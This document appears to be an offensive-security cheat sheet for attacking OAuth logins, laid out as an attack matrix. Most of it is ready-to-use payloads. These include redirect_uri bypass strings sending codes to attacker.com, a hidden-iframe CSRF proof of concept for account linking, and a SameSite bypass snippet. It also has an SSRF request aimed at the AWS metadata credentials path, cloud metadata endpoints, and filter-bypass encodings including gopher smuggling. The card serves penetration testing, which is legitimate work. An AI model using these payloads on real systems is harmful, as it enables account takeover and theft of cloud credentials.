# OAuth — Quick Start

Quick-reference card. Per-technique scenarios in `scenarios/oauth/`. See `authentication-principles.md` for decision tree.

## Quick attack matrix

| Attack | Time | Scenario |
|---|---|---|
| Missing state → CSRF | 5 min | `scenarios/oauth/csrf-state.md` |
| redirect_uri hijacking | 5 min | `scenarios/oauth/redirect-uri-manipulation.md` |
| Implicit flow token theft | 10 min | `scenarios/oauth/implicit-flow-attacks.md` |
| Code theft via postMessage | 15 min | `scenarios/oauth/code-theft-postmessage.md` |
| PKCE bypass | 10 min | `scenarios/oauth/pkce-downgrade.md` |
| Scope escalation | 5 min | `scenarios/oauth/scope-escalation.md` |
| SSRF via client registration | 10 min | `scenarios/oauth/ssrf-client-registration.md` |
| Token + parameter manipulation | 5 min | `scenarios/oauth/parameter-manipulation.md` |

## 5-minute smoke test

```bash
# 1. Discovery
curl https://target/.well-known/openid-configuration | jq
# Note: authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint,
#       supported response_types, code_challenge_methods_supported

# 2. Missing state?
GET /auth?client_id=...&redirect_uri=...&response_type=code
#                                                              ^^^ no &state= ?

# 3. Test redirect_uri injection
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com@attacker.com

# 4. Implicit flow allowed?
?response_type=token   → tokens land in URL fragment

# 5. PKCE optional?
# Send token request without code_verifier — if 200, PKCE not enforced
```

## redirect_uri bypass payloads

```
# Complete bypass
https://attacker.com

# Prefix matching
https://target.com.attacker.com
https://target.com@attacker.com
https://target.com%2eattacker.com
https://target-com.attacker.com

# Directory traversal
https://target.com/oauth-callback/../
https://target.com/oauth-callback/../evil
https://target.com/oauth-callback/..%2fevil
https://target.com/oauth-callback/..;/evil
https://target.com/oauth-callback/....//

# Subdomain
https://evil.target.com
https://target.evil.com

# Parameter pollution
?redirect_uri=https://target.com&redirect_uri=https://attacker.com

# Fragment / path confusion
https://target.com/callback%23@attacker.com
https://target.com//attacker.com
https://target.com\attacker.com
https://target.com/.attacker.com

# URL encoding
https://target.com/%2f/attacker.com
https://target.com%2f%2fattacker.com

# Case
https://TARGET.COM
https://Target.Com

# Port / userinfo
https://target.com:443@attacker.com
https://target.com:8080/callback

# Open redirect chain
https://target.com/redirect?url=https://attacker.com
https://target.com/post/next?path=https://attacker.com
```

## CSRF account-linking PoC

```html
<!-- Pre-authorize attacker → get attacker code → trick victim to follow link -->
<iframe
    src="https://target.com/oauth-linking?code=ATTACKER_AUTHORIZATION_CODE"
    style="display:none;">
</iframe>
```

When victim has session, the iframe completes the link silently.

## SameSite=Lax bypass (re-linking via top-level navigation)

```javascript
// Same-origin XSS or open redirect on victim domain triggers:
window.location = '/accounts/oauth2/<provider>/callback/?code=<ATTACKER_CODE>'
// Top-level GET → cookies sent (Lax allows it) → callback links attacker identity
```

## SSRF via dynamic client registration

```http
POST /reg HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

# Then trigger fetch:
GET /client/<RETURNED_CLIENT_ID>/logo HTTP/1.1
# Response contains AWS credentials
```

Cloud metadata targets:
```
AWS:    http://169.254.169.254/latest/meta-data/
Azure:  http://metadata.azure.com/metadata/instance?api-version=2021-02-01
GCP:    http://metadata.google.internal/computeMetadata/v1/
```

## SSRF filter bypass

```
http://0xA9FEA9FE/                       # hex (169.254.169.254)
http://2852039166/                       # int
http://[::ffff:169.254.169.254]/         # IPv6
http://169.254.169.254.xip.io/           # DNS reflector
gopher://internal:6379/_<commands>       # protocol smuggling
```

## OAuth endpoints / params

```
/.well-known/openid-configuration         # Discovery
/.well-known/jwks.json                    # Public keys
/auth, /authorize                         # Authorization
/token                                    # Token endpoint
/userinfo, /me                            # User info
/introspect, /revoke                      # Introspection / revocation
/reg, /register                           # Dynamic registration
```

Auth params: `client_id`, `redirect_uri`, `response_type` (code/token/id_token), `scope`, `state`, `nonce`, `code_challenge`, `code_challenge_method` (S256/plain), `prompt`.

Token request: `grant_type=authorization_code` + `code` + `redirect_uri` + `client_id`/`client_secret` + `code_verifier` (PKCE).

## Validation tests

```bash
GET /callback?code=$CODE&state=ANY_VALUE         # 200 = state not validated
POST /token (no &code_verifier=)                 # 200 = PKCE optional
POST /token (same code twice)                    # 200 second = code not single-use
```

## Burp / Tools

- Burp + JWT Editor + Collaborator for SSRF testing.
- OAuth Debugger: https://oauthdebugger.com/
- jwt.io for ID token decode.
- ngrok for attacker callbacks.

## Resources

- `INDEX.md`, `scenarios/oauth/`, `oauth-resources.md`.
- PortSwigger Web Security Academy: https://portswigger.net/web-security/oauth
